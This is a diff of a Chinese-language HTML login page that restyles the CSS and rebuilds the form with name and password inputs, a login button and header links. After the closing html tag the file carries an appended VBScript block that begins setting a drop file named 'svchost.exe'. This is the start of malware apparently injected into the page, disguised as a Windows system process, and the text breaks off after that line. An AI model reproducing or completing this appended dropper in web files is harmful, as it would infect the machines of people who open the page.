@@ -4,50 +4,78 @@
     <meta charset="UTF-8">
     <title>登录</title>
     <style type="text/css">
-        body{padding: 0;
+
+        body{width: 100%;
+            height: 100%;
+            font-size: 62.5%;
+            padding: 0;
              margin: 0;
              background-color:#eff0f4 }
-        .g{width: 100%;
-             height: 100%;
-            font-size: 62.5%
-            }
-        .a{background-color: #FFFFFF;
+        .a{background-color:#5fc0cd ;
             width: 100%;
-            height: 100px;
-            margin: 14px 0 0 0;
+            height: 4.4rem;
+            margin:0;
+            color: white;
+            }
+         .b {font-size: 1.8rem;
+             text-align: center;
+             position:relative;
+             top:1.5rem }
+        .c{font-size: 1.6rem;
+            position:relative ;
+            left: 1.5rem;
+            top: -0.3rem}
+        .d{font-size: 1.5rem;
+            text-align: right;
             position: relative;
-            top: -5px;}
-         .b {color: #e1e5e7;
-             font-size: 3em;
-            position:absolute ;
-            left: 150px;
-            top: 165px}
-        .c{color: #e1e5e7;
-            font-size: 3em;
-            position:absolute ;
-            left: 150px;
-            top: 275px}
-        .d{position: relative;
-            top: 75px; }
-         .e{color:#5fc0cd;
-             font-size: 3em;
-             position: absolute;
-             right: 30px;
-             top: 563px}
+            right: 1.5rem;
+            top: -2.1rem}
+         .e{width: 100%;
+             height: 5rem;
+             background-color: white;
+             position: relative;
+             top: 0.8rem}
+        .f{width: 100%;
+           height: 4.7rem;
+            border:thin white solid;
+            margin: 0;
+            padding: 0;
+           color:#e1e5e7;
+           font-size: 1.6rem;
+           position: relative;
+           top: -5rem;
+           left: 7rem}
+        .g{background-color:#5fc0cd;
+           width: 100%;
+           height: 5rem;
+            border: none;
+            position: relative;
+            top: 3.5rem;
+            font-size: 1.8rem;
+            color: white}
+        .h{color:#5fc0cd;
+            font-size: 1.6rem;
+           text-align: right;
+           position: relative;
+           right:1.2rem;
+            top:4.5rem }
         </style>
 </head>
-<body><div class="g">
-<img src="./images/task4_01.png" width="100%" height="120px"/>
-<div class="a"><img src="./images/task4_05.png" />  </div>
-    <div class="b">请输入手机号</div>
-
-<div class="a"><img src="./images/task4_06.png"></div>
-    <div class="c">请输入密码</div>
-   <div class="d"> <img src="./images/task4_04.png" width="100%" height="120px"/></div>
-    <div class="e">忘记密码？</div>
-
-
+<body>
+<div class="a">
+    <div class="b">登录</div>
+    <div class="c">关闭</div>
+    <div class="d">注册</div>
 </div>
+<div class="e"><img src="./images/task4_02.jpg" width="8%">
+    <input type="text" class="f" placeholder="请输入您的姓名" onclick="this.value=''" onblur="this.placeholder='请输入您的姓名'" />
+</div>
+<p></p>
+<div class="e"><img src="./images/task4_03.jpg" width="8%">
+    <input type="password" class="f" placeholder="请输入密码" onclick="this.value=''" onblur="this.placeholder='请输入密码'" />
+    </div>
+<input type="button" class="g" value="登录"/>
+<div class="h">忘记密码？</div>
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
